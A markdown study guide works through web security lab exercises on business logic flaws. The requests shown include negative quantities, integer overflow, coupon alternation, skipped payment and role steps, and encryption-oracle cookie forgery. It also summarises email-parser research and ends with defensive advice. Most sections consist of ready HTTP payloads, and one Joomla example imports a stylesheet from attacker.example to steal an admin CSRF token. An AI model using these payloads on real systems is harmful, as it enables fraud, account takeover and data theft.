# 1. Business Logic Vulnerabilities

Business logic vulnerabilities are flaws in an application's design that allow attackers to manipulate legitimate functionality for malicious purposes — typically by exploiting unusual application states that developers failed to anticipate or handle safely.

> **Note:** "Business logic" refers to the rules governing how an application operates. These vulnerabilities are also called **application logic vulnerabilities** or **logic flaws**.

Unlike technical bugs, logic flaws are invisible during normal use. Attackers exploit them by interacting with the app in unintended ways — such as skipping purchase steps, altering transaction values, or passing unexpected input to trigger unintended server-side behavior.

---

## How Do Business Logic Vulnerabilities Arise?

They stem from **flawed assumptions** developers make about how users will interact with the application — leading to inadequate input validation. A common example: assuming users only interact via a browser, causing the app to rely on weak client-side controls that are easily bypassed with an intercepting proxy.

When an attacker deviates from expected behavior, the application simply isn't equipped to handle it safely.

> **Complex systems are especially at risk.** Developers working on large codebases may not fully understand how all components interact. One team member's wrong assumption about another's code can quietly introduce serious logic flaws — particularly when those assumptions are never explicitly documented.

---

## Impact of Business Logic Vulnerabilities

The impact is **highly variable** — from trivial to critical — depending on what functionality is affected. Even quirky, hard-to-exploit logic should be fixed, as someone else may find a way.

Key risk areas:

- **Authentication flaws** → privilege escalation, full auth bypass, exposure of sensitive data
- **Financial logic flaws** → stolen funds, fraud, significant business losses
- **Indirect damage** → even without direct attacker gain, flawed logic can still harm the business

> The core principle: any unintended behavior is a potential attack vector. Severity scales with how critical the affected functionality is.

---

# 2. Examples of business logic vulnerabilities

Business logic vulnerabilities are relatively specific to the context in which they occur. However, although individual instances of logic flaws differ hugely, they can share many common themes. In particular, they can be loosely grouped based on the initial mistakes that introduced the vulnerability in the first place.

## 2.1 - Excessive trust in client-side controls

- **Flawed assumption:** users only interact via the web interface → leads to over-reliance on client-side validation
- **The reality:** attackers use tools like **Burp Proxy** to tamper with data after the browser sends it but before it hits server-side logic — bypassing client-side controls entirely
- **Root cause:** accepting data at face value without server-side validation or integrity checks
- **Impact:** highly variable but potentially devastating — affecting both business logic and overall site security, with relatively minimal attacker effort

productId=1&redir=PRODUCT&quantity=1&price=1
productId=1&redir=PRODUCT&quantity=1&price=free

## 2.2 - Failing to Handle Unconventional Input

Business logic restricts user input to values that make sense for the application — such as numeric limits for inventory, budgets, or supply chain triggers. The problem arises when developers fail to anticipate edge cases, leaving unexpected inputs unhandled and potentially exploitable.

A classic example: **negative numeric values**. If an application doesn't explicitly reject them, an attacker can abuse this. Consider a bank transfer check:

```
if ($transferAmount <= $currentBalance) { // Complete the transfer }
```

Sending `-$1000` would always pass the balance check and reverse the transfer direction — effectively stealing funds from the victim.

> These flaws are easy to miss during development, especially when client-side controls mask the issue on the surface.

**When auditing, use tools like Burp Proxy and Repeater to test unconventional inputs** — extremely high/low numbers, abnormally long strings, unexpected data types. Ask yourself:

- Are there limits imposed on the data?
- What happens when those limits are reached?
- Is any transformation or normalization applied to the input?

If one form mishandles unconventional input, others on the same application likely will too.

### High-Level Logic Vulnerability – Negative Quantity Manipulation

The server accepts and applies client-supplied `quantity` values without enforcing a minimum constraint. Submitting a **negative quantity** causes the cart total to subtract value, allowing the total to drop below zero or within store credit range.

#### Steps

- Add a cheap item to cart normally
- Intercept the `POST /cart` request and modify `quantity` to a negative value
- Confirm the cart total decreases accordingly
- Add the target item (leather jacket) at normal quantity
- Apply a large enough negative quantity on the cheap item to bring the total within store credit
- Place the order

#### Payloads

```http
# Step 1: Test negative quantity acceptance
POST /cart HTTP/2
productId=4&quantity=-1&redir=CART

# Step 2: Drive total into negative territory
POST /cart HTTP/2
productId=4&quantity=-100&redir=CART

# Step 3: Add target item normally
POST /cart HTTP/2
productId=1&quantity=1&redir=CART

# Step 4: Offset jacket price with large negative quantity on cheap item
POST /cart HTTP/2
productId=4&quantity=-1000&redir=CART
```

### Low-Level Logic Flaw – Integer Overflow

The backend stores cart totals as a **signed 32-bit integer** (max: `2,147,483,647` cents). By repeatedly adding high-priced items in bulk, the cumulative total overflows past the ceiling and **wraps to a large negative value** (`-2,147,483,648`). Fine-tuning the final quantity lands the total between `$0` and available store credit, bypassing the payment check entirely.

#### Steps

- Server only accepts up to 2-digit quantities per request
- Use Burp Intruder with `Null payloads` set to `Continue indefinitely` and max concurrent requests to `1`, to flood the cart and trigger the overflow
- Monitor cart total until it flips to a large negative integer
- Clear cart, then re-run Intruder with exactly `323` payloads to get a controlled overflow
- Send a manual request for `47` more jackets — total should land at `-$1221.96`
- Add a cheap filler item to nudge the total into the `$0–$100` store credit range
- Place the order

#### Payloads

```http
# Step 1: Probe max quantity per request
POST /cart HTTP/2
productId=1&quantity=99&redir=CART

# Step 2: Flood via Intruder (null payloads, indefinite) until overflow occurs
POST /cart HTTP/2
productId=1&quantity=99&redir=CART

# Step 3: Clear cart, re-run Intruder with exactly 323 payloads
POST /cart HTTP/2
productId=1&quantity=99&redir=CART

# Step 4: Fine-tune with 47 manual jackets → total = -$1221.96
POST /cart HTTP/2
productId=1&quantity=47&redir=CART

# Step 5: Add cheap filler item to bring total to $0–$100
POST /cart HTTP/2
productId=2&quantity=<calculated>&redir=CART
```

## 2.3 - Making flawed assumptions about user behavior

**Making flawed assumptions about user behavior** is a root cause of logic vulnerabilities. Developers often fail to account for dangerous scenarios that violate their assumptions — the following examples illustrate how such assumptions lead to logic flaws.

---

### Trusted users won't always remain trustworthy

Applications often assume that users who passed initial security controls can be **trusted indefinitely**, leading to lax enforcement thereafter. If business rules aren't applied **consistently throughout**, dangerous loopholes can emerge for attackers to exploit.

#### Inconsistent Security Controls – Post-Registration Email Change to Gain Admin Access

The app restricts `/admin` to `@dontwannacry.com` accounts but only enforces this check against the **current email on file** — not the one used at registration. Since the email change feature has no domain restriction, any registered user can swap to a `@dontwannacry.com` address post-registration and immediately gain admin access.

##### Steps

- Discover `/admin` — note it requires a `@dontwannacry.com` account
- Register normally using your lab-provided email to receive the confirmation link
- Log in, navigate to account settings, and change email to any `@dontwannacry.com` address
- Access `/admin`

##### Payloads

```http
# Step 1: Register with your real lab email
POST /register HTTP/2
username=attacker&email=attacker@YOUR-EMAIL-ID.web-security-academy.net&password=password

# Step 2: Update email to a dontwannacry.com address (no verification required)
POST /my-account/change-email HTTP/2
email=attacker@dontwannacry.com

# Step 3: Access admin
GET /admin HTTP/2
```

---

### Users won't always supply mandatory input

Attackers can tamper with or **remove parameters entirely**, bypassing browser-level input validation. When multiple functions share a server-side script, absent parameters may unlock unintended code paths.

When probing for logic flaws, remove each parameter in turn and observe the response. Make sure to:

* Remove **one parameter at a time** to hit all relevant code paths.
* Delete the **parameter name** as well as the value — servers often handle these differently.
* **Follow multi-stage processes** to completion, as tampering in one step may affect later ones.

Apply this to URL params, POST params, and **cookies**.

#### Weak Isolation on Dual-Use Endpoint – Password Change Without Authentication

The password change endpoint uses a client-supplied `username` parameter to determine which account to modify, and only performs the current-password check if the parameter is **present**. Dropping `current-password` entirely bypasses the check, allowing an attacker to set a new password on any account — including `administrator`.

##### Steps

- Log in and trigger a normal password change to capture the request
- Remove the `current-password` parameter entirely from the request
- Change `username` to `administrator` and set a new password of your choice
- Log out, log in as `administrator` with the new password
- Access `/admin`

##### Payloads

```http
# Step 1: Normal password change (captured baseline)
POST /my-account/change-password HTTP/2
username=wiener&current-password=peter&new-password-1=test&new-password-2=test

# Step 2: Drop current-password param and target administrator
POST /my-account/change-password HTTP/2
username=administrator&new-password-1=hacked&new-password-2=hacked

# Step 3: Access admin
GET /admin HTTP/2
```

---

### Users won't always follow the intended sequence

Attackers won't follow intended workflows — failing to account for this enables dangerous flaws. For example, skipping 2FA by jumping directly to authenticated pages bypasses the verification step entirely. Using tools like Burp Proxy, attackers can replay requests in any order, interacting with the application in unexpected states.

To identify these flaws, use **forced browsing** to submit requests out of sequence — skip steps, repeat them, or return to earlier ones. Note how steps are accessed (specific URLs vs. parameter sets) and identify developer assumptions to find where they can be violated.

Out-of-sequence testing often triggers exceptions with **null/uninitialized values** — pay close attention to any error messages or debug info, as these can reveal key backend behavior useful for refining an attack.

---

#### Insufficient Workflow Validation – Skipping Payment Step via Direct Confirmation Request

The server trusts that anyone reaching the order confirmation endpoint has already completed a valid payment step. There is **no server-side validation** tying a confirmation to an actual successful checkout — replaying `GET /cart/order-confirmation?order-confirmation=true` directly fulfills any order in the cart, bypassing payment entirely.

##### Steps

- Buy a cheap item normally to capture the confirmation request
- Add the leather jacket to cart
- Replay the captured confirmation request directly, skipping the checkout/payment step

##### Payloads

```http
# Step 1: Normal checkout (captured baseline)
POST /cart/checkout HTTP/2
csrf=<token>

# Step 2: Add leather jacket to cart
POST /cart HTTP/2
productId=1&quantity=1&redir=CART

# Step 3: Replay confirmation request directly — order fulfilled without payment
GET /cart/order-confirmation?order-confirmation=true HTTP/2
```

---

#### Authentication Bypass via Flawed State Machine – Skipping Role Selection Step

The login flow assumes users will always pass through `/role-selector` after authentication, defaulting the session role to **administrator** until explicitly changed. By dropping the `GET /role-selector` request after a successful login, the user-role-assignment step never executes, leaving the session privileged as admin.

##### Steps

- Log in normally and observe the post-login redirect to `/role-selector`
- Confirm `/admin` is inaccessible before role selection completes normally
- Log out, intercept traffic, and log in again
- Forward the `POST /login` request, but **drop** the subsequent `GET /role-selector` request
- Browse directly to the home page — session role defaults to `administrator`
- Access `/admin`

##### Payloads

```http
# Step 1: Normal login
POST /login HTTP/2
username=wiener&password=peter

# Step 2: Drop this request entirely (intercepted in Burp, do not forward)
GET /role-selector HTTP/2

# Step 3: Browse directly to home page — role defaults to administrator
GET / HTTP/2

# Step 4: Access admin
GET /admin HTTP/2
```

## 2.4 - Domain-specific flaws

Domain-specific flaws are tied to a site's business purpose. **Discount logic** in e-commerce is a classic target: if an app applies a discount (e.g., 10% off orders over $1000) without rechecking the order afterward, an attacker can hit the threshold, then remove items — keeping the discount on a now-ineligible order.

Pay close attention to any case where prices or sensitive values adjust based on user-driven criteria — understand the underlying algorithm and *when* it's applied, then manipulate the state so the adjustment no longer matches its original criteria.

Finding these flaws requires thinking like an attacker and often **domain-specific knowledge** — without it, you may miss how seemingly harmless functions combine into something exploitable. For unfamiliar domains, study available documentation and consult subject-matter experts; obscure domains are more likely to harbor bugs others have overlooked.

---

### Flawed Enforcement of Business Rules – Coupon Reuse via Alternation

The coupon system only checks whether the **same code** was applied immediately before, not whether it's already been used overall. Alternating between two valid codes bypasses the "already applied" check, allowing both to be stacked repeatedly until the order total drops below available store credit.

#### Steps

- Collect both coupon codes (`NEWCUST5` from the start, `SIGNUP30` from newsletter signup)
- Add the leather jacket to cart
- Apply both codes once each at checkout
- Confirm reapplying the same code twice in a row is rejected
- Alternate between the two codes repeatedly to keep discounting the total
- Stop once total falls within store credit and complete the order

#### Payloads

```http
# Step 1: Apply first coupon
POST /cart/coupon HTTP/2
coupon=NEWCUST5

# Step 2: Apply second coupon
POST /cart/coupon HTTP/2
coupon=SIGNUP30

# Step 3: Alternate repeatedly to bypass "already applied" check
POST /cart/coupon HTTP/2
coupon=NEWCUST5

POST /cart/coupon HTTP/2
coupon=SIGNUP30

POST /cart/coupon HTTP/2
coupon=NEWCUST5

POST /cart/coupon HTTP/2
coupon=SIGNUP30

# Repeat until total <= store credit, then checkout
POST /cart/checkout HTTP/2
csrf=<token>
```

### Infinite Money Logic Flaw – Automated Gift Card Discount Loop

The coupon system allows a **30% discount** to be applied when purchasing gift cards, but doesn't account for the fact that this lets users buy a $10 gift card for $7 and redeem it for the full $10 — a 3 net profit per cycle. Since nothing prevents repeating this purchase-redeem cycle, automating it via a Burp session macro generates unlimited store credit.

#### Steps

- Sign up for the newsletter to get the `SIGNUP30` coupon
- Buy a $10 gift card, apply the coupon for 30% off, complete checkout
- Redeem the gift card code on the account page — confirm $3 net profit per cycle
- Build a Burp session-handling macro that chains: add gift card to cart → apply coupon → checkout → grab confirmation page → extract gift card code → redeem it
- Configure the macro to auto-extract the `gift-card` parameter from the order confirmation response and feed it into the redemption request
- Run the macro repeatedly via Intruder (null payloads, 412 iterations, 1 concurrent request) to farm store credit automatically
- Once enough credit is accumulated, buy the leather jacket

#### Payloads

```http
# Step 1: Add gift card to cart
POST /cart HTTP/2
productId=<gift-card-id>&quantity=1&redir=CART

# Step 2: Apply 30% discount coupon
POST /cart/coupon HTTP/2
coupon=SIGNUP30

# Step 3: Checkout
POST /cart/checkout HTTP/2
csrf=<token>

# Step 4: Get confirmation page (contains gift card code to extract)
GET /cart/order-confirmation?order-confirmed=true HTTP/2

# Step 5: Redeem gift card (gift-card param auto-derived from Step 4 response via macro)
POST /gift-card HTTP/2
gift-card=<extracted-from-confirmation-page>

# Step 6: Trigger macro repeatedly via Intruder against any lightweight endpoint
GET /my-account HTTP/2
```

## 2.5 - Providing an encryption oracle

An **encryption oracle** occurs when user-controllable input is encrypted and the ciphertext returned to the user, letting an attacker encrypt arbitrary data with the app's own algorithm/key. This becomes dangerous if other inputs elsewhere expect data encrypted the same way — the attacker can craft valid encrypted payloads via the oracle and feed them into sensitive functions.

A matching **decryption oracle** compounds the issue, letting attackers decrypt other data to learn its structure (helpful but not essential for exploitation). Severity depends on what else relies on the same encryption algorithm.

---

### Authentication Bypass via Encryption Oracle – Reusing Shared CBC Key for Forgery

The application uses the **same encryption key/algorithm** for both the `stay-logged-in` cookie and the `notification` cookie, exposing the latter as a chosen-plaintext/chosen-ciphertext **encryption oracle**. By using the `email` parameter to encrypt arbitrary text and the `notification` cookie to decrypt arbitrary ciphertext, an attacker can learn the cookie format, strip a known prefix via **CBC byte-block manipulation**, and forge a valid `stay-logged-in` cookie for the `administrator` account.

#### Steps

- Log in with "Stay logged in" enabled, post a comment, and observe the encrypted `stay-logged-in` and `notification` cookies
- Submit an invalid email to trigger the reflected error and confirm it's sourced from the decrypted `notification` cookie
- Use the comment `email` parameter as an **encrypt oracle** and the `notification` cookie as a **decrypt oracle**
- Decrypt your own `stay-logged-in` cookie to learn its format: `username:timestamp`
- Encrypt `administrator:<timestamp>` via the email parameter, then inspect the ciphertext — note the fixed 23-byte `"Invalid email address: "` prefix is always prepended
- Since the cipher is block-based (16-byte blocks), pad the encrypt input with 9 extra leading characters so the prefix consumes exactly 32 bytes (2 full blocks)
- Strip the first 32 bytes from the ciphertext (Base64/URL-decode → hex-edit → re-encode) to remove the prefix entirely, leaving a clean encrypted `administrator:<timestamp>`
- Replace your `stay-logged-in` cookie with this forged ciphertext, delete the `session` cookie, and send the request to log in as admin
- Access `admin`

#### Payloads

```http
# Step 1: Trigger notification cookie via invalid email (decrypt oracle source)
POST /post/comment HTTP/2
csrf=<token>&postId=1&comment=test&name=test&email=invalid&website=https://test.com

GET /post?postId=1 HTTP/2
Cookie: notification=<encrypted-error-cookie>

# Step 2: Decrypt your own stay-logged-in cookie to learn the format
GET /post?postId=1 HTTP/2
Cookie: notification=<your-stay-logged-in-cookie-value>
# Response reveals: wiener:1598530205184

# Step 3: Encrypt target payload with padding (9 chars to make prefix = 32 bytes)
POST /post/comment HTTP/2
csrf=<token>&postId=1&comment=test&name=test&email=xxxxxxxxxadministrator:1598530205184&website=https://test.com
# Capture resulting Set-Cookie: notification=<ciphertext>

# Step 4: Decode, strip first 32 bytes, re-encode (done in Burp Decoder/Hex editor)
# Base64-decode -> delete first 32 bytes -> Base64-encode -> URL-encode

# Step 5: Verify clean decryption (no prefix)
GET /post?postId=1 HTTP/2
Cookie: notification=<trimmed-ciphertext>
# Response should show only: administrator:1598530205184

# Step 6: Forge admin session
GET / HTTP/2
Cookie: stay-logged-in=<trimmed-ciphertext>
# (session cookie removed entirely)

# Step 7: Access admin
GET /admin HTTP/2
```

## 2.6 - Email address parser discrepancies

Apps that parse email addresses to determine domain ownership are vulnerable to **parser discrepancies** when different parts of the application handle addresses inconsistently. Attackers can use encoding tricks to craft addresses that pass validation but get parsed differently by the server, enabling **unauthorized access** — e.g., registering with a seemingly valid address from a restricted domain to reach admin panels or restricted functions.

Check here: https://i.blackhat.com/BH-US-24/Presentations/US24-Heyes-Splitting-the-Email-Atom-Exploiting-Parsers-to-Bypass-Access-Controls-Wednesday.pdf

or Check Section 3 for cheatsheet.

### Email Parser Discrepancy – UTF-7 Encoded-Word Bypass for Domain Validation

The registration validator checks the email's domain against `ginandjuice.shop` but parses **encoded-word syntax** (`=?charset?encoding?text?=`) differently than the mail-sending logic. While the validator recognizes and blocks common encodings like Q and UTF-8, it fails to detect **UTF-7**, which can encode the `@` symbol itself — letting an attacker construct an address that *passes domain validation* but is interpreted as pointing to the attacker's own mail server.

#### Steps

- Confirm domain restriction by registering with an off-domain email — rejected
- Test encoded-word email with Q-encoding — blocked as suspicious
- Test encoded-word email with UTF-8 — also blocked
- Test encoded-word email with UTF-7 — passes validation undetected
- Craft a UTF-7 payload encoding `@` and space characters so the visible string ends in `@ginandjuice.shop` (satisfying the validator) while the actual decoded address routes to the attacker's exploit server
- Register with this crafted address and retrieve the confirmation email from the exploit server's mail client
- Click the confirmation link to activate the account
- Log in and access the admin panel

#### Payloads

```http
# Step 1: Baseline — off-domain email rejected
POST /register HTTP/2
email=foo@exploit-server.net&username=attacker&password=password

# Step 2: Q-encoding — blocked
POST /register HTTP/2
email==?iso-8859-1?q?=61=62=63?=foo@ginandjuice.shop&username=attacker&password=password

# Step 3: UTF-8 encoded-word — blocked
POST /register HTTP/2
email==?utf-8?q?=61=62=63?=foo@ginandjuice.shop&username=attacker&password=password

# Step 4: UTF-7 encoded-word — bypasses validation
POST /register HTTP/2
email==?utf-7?q?&AGEAYgBj-?=foo@ginandjuice.shop&username=attacker&password=password

# Step 5: Exploit payload — decodes to "attacker@[EXPLOIT-SERVER-ID] ?=@ginandjuice.shop"
POST /register HTTP/2
email==?utf-7?q?attacker&AEA-[YOUR-EXPLOIT-SERVER-ID]&ACA-?=@ginandjuice.shop&username=attacker&password=password

# Step 6: Click confirmation link from exploit server's email client, then log in as admin
GET /admin HTTP/2
```

# 3. Email Atom

Many websites treat the domain portion of an email address as a trust signal — if you register with `@yourcompany.com`, the app assumes you belong to that organisation. The problem is that the email RFCs are decades old, extremely permissive, and full of legacy features (quoted strings, comments, escapes, multiple encoding schemes) that most developers have never heard of. Applications rarely parse email addresses themselves; they hand the job off to a library, and that library's interpretation of "valid" doesn't always match the mail server's. When two different systems disagree about what an address actually means, an attacker can exploit the gap to make an email land somewhere the application never intended — bypassing domain-based access controls, and in some cases achieving remote code execution.

### Methodology

<img width="1323" height="646" alt="image" src="https://github.com/user-attachments/assets/2543fa00-a74c-444b-a0fb-df9c080f6227" />

The overall approach that emerged from this research can be summarized as four repeatable steps: **Probe**, **Observe**, **Encode**, **Exploit**:

1. **Probe** a target with a minimal test payload to see whether it supports a given encoding (encoded-word, Punycode, etc.).
2. **Observe** how the decoded value comes back — using a Collaborator-style out-of-band listener to inspect the raw SMTP conversation is far more informative than just watching for validation errors.
3. **Encode** the specific characters needed for an exploit, and re-observe how each one is transformed.
4. **Exploit** once you have confirmed which characters you can smuggle through.

### Tooling

```text
<@_encoded_word_encode('...')>@<@/_encoded_word_encode>

<@_encoded_word_decode('...')>=40<@/_encoded_word_decode>
```

<img width="1313" height="457" alt="image" src="https://github.com/user-attachments/assets/38847bb8-babc-4c7d-904a-c4e223468e3b" />

- **Hackvertor tags** — several custom tags (available via the Hackvertor Burp Suite extension) automate generation and decoding of Unicode-overflow characters, encoded-word strings, and UTF-7 email content, so payloads can be built inline inside a request.
- **Turbo Intruder script** — automates testing a target that is known to support encoded-word decoding against a catalogue of known email-splitting techniques (nulls, terminators, etc.) collected from the GitHub, Zendesk, GitLab, and other case studies, reporting back via Collaborator interactions when a split succeeds.
- **Punycode fuzzer** — generates large batches of malformed Punycode strings around a template, substituting random characters, and checks the decoded output against target patterns to identify which characters can be produced.

## 3.1 RFC 2822 legacy syntax

RFC 2822 permits quoting, escaping, and comments inside an address — features almost no modern developer expects, but which are still legal and still parsed by real mail software.

### Quoted local-part

The local part of an address can be wrapped in double quotes, which relaxes what characters are allowed inside it — including characters like `@` that would otherwise terminate the local part.

```text
Input:  "@"@example.com
Effect: the local part is the literal character @, domain is example.com
```

```text
Input:  "foo bar"@example.com
Effect: a space is legal inside a quoted local part; local part is "foo bar"
```

### Quoted pair (escaped characters)

Within a quoted string, a backslash escapes the following character, letting you include characters — such as a literal quote or backslash — that would otherwise break the quoting.

```text
Input:  "\""@example.com
Effect: local part decodes to a single literal double-quote character
```

```text
Input:  "\\"@example.com
Effect: local part decodes to a single literal backslash character
```

### Comments

RFC 2822 allows comments delimited by parentheses anywhere in an address; they are stripped during parsing and can appear before, after, or in between the local part and domain.

```text
Input:  foo@example.com(bar)
Effect: comment (bar) is stripped; address parses as foo@example.com
```

```text
Input:  foo(bar)@example.com
Effect: comment (bar) is stripped; address parses as foo@example.com
```

```text
Input:  (bar)foo@example.com
Effect: comment (bar) is stripped; address parses as foo@example.com
```

These are individually harmless, but they matter because a validator that doesn't strip comments the same way the mail server does will "see" a different address than the one that actually gets used — and because comments can later be combined with routing tricks (see 3.3) to hide a real domain from a naive checker.

## 3.2 Legacy MTA routing behaviors

Independent of what the RFC allows syntactically, some mail transfer agents (MTAs) implement decades-old routing conventions that can send a message somewhere other than the domain written after the `@`.

### Source routes

RFC 2822 source routing lets a sender specify a comma-separated chain of relay hosts before the final destination, separated by a colon.

```text
Input:  @example1.com,@example2.com:foo@psres.net
Effect: message is routed via example1.com and example2.com, final delivery to foo@psres.net
```

**Comment-based source route (Postfix).** A parenthesised comment can be used to visually "hide" the real domain from a validator, while Postfix still treats part of the local part as a route to another host.

```text
Input:  foo%psres.net(@example.com
Effect: delivered to foo@psres.net, not example.com
```

### Percent hack

Some mailers convert an unescaped `%` in the local part into an `@`, effectively re-forwarding the message once it reaches the first domain.

```text
Input:  foo%psres.net@example.com
Effect: message first hits example.com, then is re-routed to foo@psres.net
```

### UUCP (Unix-to-Unix Copy)

UUCP is a pre-internet protocol that used `!` to separate host and user, in the *opposite* order to a normal email address (`host!user` rather than `user@host`). Some MTAs (notably Sendmail) still fall back to UUCP-style routing when they encounter an escaped `@` followed by `!`.

```text
Syntax: host!user
```

```text
Input:  oastify.com!collab\@example.com
Effect: delivered to collab@oastify.com, not example.com
```

## 3.3 Chaining syntax and routing behavior

The individually "harmless" RFC features from 3.1 become exploitable once combined with the routing quirks from 3.2 — quoting or escaping a character is often enough to smuggle a routing directive past an application's validation logic while an MTA still honors it.

### SMTP `ORCPT` parameter smuggling

The optional `ORCPT` SMTP parameter, combined with mishandled escape characters inside a quoted local part, can be abused to redirect the effective destination.

```text
Input:  "collab\"@psres.net> ORCPT=test;admin"@example.com
Effect: delivered to collab@psres.net (confirmed against Postfix)
```

> **Note:** double-check the exact number of backslashes against your own test traffic before publishing — quoted-pair escaping is sensitive to this, and it's worth confirming which form (single vs. double backslash) actually reproduces the effect described.

### Other Postfix oddities

These two were confirmed to work but weren't tied to a specific access-control bypass in an application during this research — included here as building blocks that may be useful in future chains.

```text
# Quoting doesn't prevent the UUCP fallback:
Input:  "psres.net!collab"(\"@example.com
Effect: delivered to collab@psres.net

# Source routing still works even with a bracketed IP-literal domain:
Input:  collab%psres.net@[127.0.0.1]
Effect: delivered to collab@psres.net
```

## 3.4 Unicode overflows

Applications commonly block multiple `@` characters as a defense against the tricks above. To get around that, this technique looks at what happens when high Unicode code points get passed through functions like PHP's `chr()`, which reduces any input to a single byte using a modulus-256 operation:

```php
// PHP chr() generates characters 0x00-0xFF (0-255) by wrapping
while ($bytevalue < 0) {
    $bytevalue += 256;
}
$bytevalue %= 256;
```

If you choose a Unicode code point that is a multiple of 256 plus the target byte value, the modulus operation "overflows" back down to that character. Fuzzing against a target with Turbo Intruder showed a wide variety of exotic Unicode characters collapsing down to ordinary ASCII symbols — including `@` — once processed.

This alone doesn't produce a working email-splitting exploit on its own, but it proves blocked characters can be smuggled through unexpected channels, which is what motivates combining it with the encoding techniques in 3.5.

### Generating an overflow

```js
String.fromCodePoint(0x100 + 0x40)   // ŀ  → decodes to @
String.fromCodePoint(0x1000 + 0x40)  // ၀  → decodes to @
String.fromCodePoint(0x10000 + 0x40) // 𐁀  → decodes to @

// 0x100 = 256 in decimal (the wraparound multiple)
// 0x40  = the target character (@)
```

Hackvertor tag form:

```text
<@_unicode_overflow(0x100,'...')>@</@_unicode_overflow>
<@_unicode_overflow_variations(0xfff,'...')>@</@_unicode_overflow_variations>
```

## 3.5 Encoded word (RFC 2047)

RFC 2047 defines "encoded-word," a syntax that lets you represent arbitrary characters inside an email header using hex (Q-encoding) or Base64. The format looks like `=?charset?encoding?data?=`.

A significant number of vulnerable systems turned out to share a common thread: they were written in Ruby and depended on the popular `mail` gem (hundreds of millions of downloads), which — surprisingly — also decodes UTF-7. That opened up further combinations: encoded-word content in UTF-7, in Base64, and even Base64-wrapped UTF-7, all decoding down to a final address that had nothing to do with what a naive validator would see. The same behavior applies to both the local part and the domain part of the address.

### Confirming decoding support

Send a minimal probe and watch the raw SMTP conversation (a Collaborator-style listener is far more informative here than a validation error) to see whether the target decodes `encoded-word` syntax before using the address.

## 3.6 Case study

### Case study: GitHub — encoded `@` + terminator + null byte

GitHub is Ruby-based, so it was a natural target once `encoded-word` decoding was confirmed. The payload combines an encoded `@` (to open a second address), an encoded `>` (to close the SMTP `RCPT TO` command early), and an encoded null byte (to make the mailer discard the trailing junk needed to satisfy validation).

```text
foo=40=3e=00@psres.net
```
(charset is irrelevant to GitHub's parser, so `x` can be used as a placeholder)

<img width="1391" height="522" alt="image" src="https://github.com/user-attachments/assets/173035be-3bdf-4dfc-ae87-6f528a69c8f2" />

**Why it matters:** this let an attacker verify arbitrary email addresses on domains they don't own, including well-known company domains. Because GitHub can act as an identity provider for Cloudflare's Zero Trust access product — which can be configured to trust GitHub-verified email domains — this became a path to unauthorized access to systems gated by that trust relationship.

### Case study: Zendesk — embedded quotes + generated `<`

Zendesk's parser tolerated uppercase letters, converted encoded spaces, and quoted characters that shouldn't have been legal in that position. The payload builds a quoted local part containing a raw `@`, then a generated `<` (via `=3c`) to close the quote cleanly once decoded.

```text
Input:  =?x?q?=41=42=43collab=40psres.net=3e=20?=@psres.net
Output seen in RCPT TO:  "ABCcollab@psres.net> "@psres.net
```

**Why it matters:** this bypassed domain-restricted registration on a support portal, allowing an account to be registered as if it belonged to a domain the attacker doesn't control.

`encoded-word` treats an underscore (`_`) as a space, giving a one-character-shorter version of the space trick used against GitLab Enterprise's Postfix-backed mailer. ## 3.7 Punycode

Punycode encodes Unicode domain names into ASCII strings always starts with `xn--` prefix, used throughout the DNS system (e.g. `münchen.com` becomes `xn--mnchen-3ya.com`). Because the encoding algorithm is sensitive to small changes — modifying a single character can shift where in the string a decoded Unicode character ends up — it's a promising target for fuzzing malformed input. 

What we want to do is generate malicious characters when the encoded value is decoded and doing that is a big challenge. In the following examples you can see the position of the unicode character changes when one byte is modified.
```
foo@xn--mnchen-2ya.com → foo@ümnchen.com
foo@xn--mnchen-3ya.com → foo@münchen.com
foo@xn--mnchen-4ya.com → foo@mnüchen.com
foo@xn--mnchen-5ya.com → foo@mncühen.com
```

Testing an online converter built on the IDN PHP library showed that certain malformed inputs (such as sequences starting with double zeros) decode to unintended punctuation characters rather than raising an error. Systematic fuzzing turned up many ways to coax out characters like commas, `@` signs, semicolons, and fragments of an opening `<svg/` tag.

### Generating arbitrary characters from malformed Punycode

```text
psres.net.com.xn--0049.com.psres.net  →  psres.net.com.,.com.psres.net
foo@xn--0117.example.com              →  foo@@.example.com
x@xn--42                      → x@,
x@xn--024                     → x@@
x@xn--694                     → x@;
x@xn--svg/-9x6                → x@<svg/
x@xn--svg/-f18                → x@<svg/
x@xn--svg/-fq1                → x@<svg/
```

### Case study: Joomla — malformed Punycode → CSS injection → RCE

Joomla uses the same vulnerable IDN library, making it a strong target: XSS there could translate into remote code execution via the admin panel. Joomla escapes email addresses correctly at output time — but only *before* Punycode decoding happens, leaving a window for malformed Punycode to reintroduce unescaped markup after decoding.

Full `<script>`-style payloads proved unreachable, since usable vectors needed an underscore character and Joomla disallows underscores in the domain part of an address. However, a single malformed Punycode subdomain was enough to generate an arbitrary *opening* HTML tag — including an opening `<style>` tag, with Joomla's surrounding markup supplying the closing `>`.

```text
Account 1 name: a{
Effect: registers with a Punycode address that decodes to an opening <style> tag
```

That's enough for a CSS-injection attack. It's persistent (visible on the admin's user list) and needs nothing more than registering an account. A second account then supplies an `@import` rule pulling in an externally hosted, malicious stylesheet:

```text
Account 2 name: x@import url(https://attacker.example/exfil.css);
```

The `{}` wrapper makes the CSS parser treat everything before it as one invalid selector and skip past it, so the `@import` still loads cleanly.

**Why it matters:** chaining that stylesheet with known CSS-exfiltration techniques allows silent, character-by-character extraction of an administrator's CSRF token as soon as the admin views the user list. That token can then be used to build a CSRF exploit that modifies an admin-accessible template to plant PHP code — achieving remote code execution from nothing more than an unauthenticated account registration.

---

## Defensive recommendations

- Disable `encoded-word` decoding in email-parsing libraries where possible; if that isn't an option, detect and reject the `=?...?=` pattern before it reaches downstream logic.
- Always validate email addresses independently — even ones asserted by a trusted-looking source such as an SSO/identity provider.
- Never rely on an email domain alone as an authorization mechanism, since — as this research demonstrates — the domain a message actually reaches can differ from the one that appears in the address string.
